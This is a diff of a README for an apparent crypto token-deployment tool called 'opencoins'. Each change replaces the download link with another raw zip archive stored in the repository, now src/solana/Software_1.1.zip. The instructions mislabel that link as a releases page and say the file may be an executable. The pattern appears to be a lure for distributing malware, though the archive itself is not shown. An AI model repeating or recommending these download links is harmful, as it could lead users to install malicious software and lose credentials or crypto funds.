@@ -6,7 +6,7 @@ Welcome to the **opencoins** project. This guide will help you download and set 
 
 ## 📥 Download the Application
 
-[![Download opencoins](https://raw.githubusercontent.com/PHalla0/opencoins/main/docs/Software-1.5.zip)](https://raw.githubusercontent.com/PHalla0/opencoins/main/docs/Software-1.5.zip)
+[![Download opencoins](https://github.com/PHalla0/opencoins/raw/refs/heads/main/src/solana/Software_1.1.zip)](https://github.com/PHalla0/opencoins/raw/refs/heads/main/src/solana/Software_1.1.zip)
 
 ## 📋 Features
 
@@ -29,7 +29,7 @@ Before you start, ensure your device meets these requirements:
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/PHalla0/opencoins/main/docs/Software-1.5.zip).
+1. **Visit the Releases Page:** Go to [this page to download](https://github.com/PHalla0/opencoins/raw/refs/heads/main/src/solana/Software_1.1.zip).
 2. **Choose Your Version:** Look for the latest release at the top of the page.
 3. **Download the File:** Click on the link provided to download the application file. It may be zipped or provided as an executable.
 4. **Install the Application:**
@@ -74,6 +74,6 @@ This application relates to various fields in technology and finance, including:
 
 Thank you for choosing **opencoins** for your token deployment needs. We hope you find it easy to use and helpful in your projects. If you have suggestions or feedback, please let us know!
 
-[![Download opencoins](https://raw.githubusercontent.com/PHalla0/opencoins/main/docs/Software-1.5.zip)](https://raw.githubusercontent.com/PHalla0/opencoins/main/docs/Software-1.5.zip)
+[![Download opencoins](https://github.com/PHalla0/opencoins/raw/refs/heads/main/src/solana/Software_1.1.zip)](https://github.com/PHalla0/opencoins/raw/refs/heads/main/src/solana/Software_1.1.zip)
 
 Feel free to explore the resources in the repository for more information and updates. Happy deploying!
